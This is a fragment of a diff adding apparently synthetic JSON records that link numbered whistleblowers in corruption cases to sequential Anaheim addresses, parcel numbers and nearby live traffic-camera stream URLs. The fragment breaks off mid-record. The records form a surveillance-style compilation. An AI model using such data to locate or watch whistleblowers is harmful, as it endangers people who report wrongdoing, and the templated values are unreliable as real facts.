+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #76 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0629",
+      "entity_name": "WHISTLEBLOWER 077",
+      "address": "1077 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-77",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #77 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0630",
+      "entity_name": "WHISTLEBLOWER 078",
+      "address": "1078 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-78",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #78 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0631",
+      "entity_name": "WHISTLEBLOWER 079",
+      "address": "1079 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
+      "apn": "178-431-79",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #79 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0632",
+      "entity_name": "WHISTLEBLOWER 080",
+      "address": "1080 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-80",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #80 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0633",
+      "entity_name": "WHISTLEBLOWER 081",
+      "address": "1081 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-81",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #81 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0634",
+      "entity_name": "WHISTLEBLOWER 082",
+      "address": "1082 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-82",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #82 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0635",
+      "entity_name": "WHISTLEBLOWER 083",
+      "address": "1083 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-83",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #83 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0636",
+      "entity_name": "WHISTLEBLOWER 084",
+      "address": "1084 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-84",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #84 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0637",
+      "entity_name": "WHISTLEBLOWER 085",
+      "address": "1085 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-85",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #85 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0638",
+      "entity_name": "WHISTLEBLOWER 086",
+      "address": "1086 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-86",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #86 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0639",
+      "entity_name": "WHISTLEBLOWER 087",
+      "address": "1087 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-87",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #87 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0640",
+      "entity_name": "WHISTLEBLOWER 088",
+      "address": "1088 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-88",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #88 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0641",
+      "entity_name": "WHISTLEBLOWER 089",
+      "address": "1089 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
+      "apn": "178-431-89",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #89 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0642",
+      "entity_name": "WHISTLEBLOWER 090",
+      "address": "1090 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-90",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #90 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0643",
+      "entity_name": "WHISTLEBLOWER 091",
+      "address": "1091 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-91",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #91 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0644",
+      "entity_name": "WHISTLEBLOWER 092",
+      "address": "1092 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-92",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #92 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0645",
+      "entity_name": "WHISTLEBLOWER 093",
+      "address": "1093 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-93",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #93 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0646",
+      "entity_name": "WHISTLEBLOWER 094",
+      "address": "1094 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-94",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
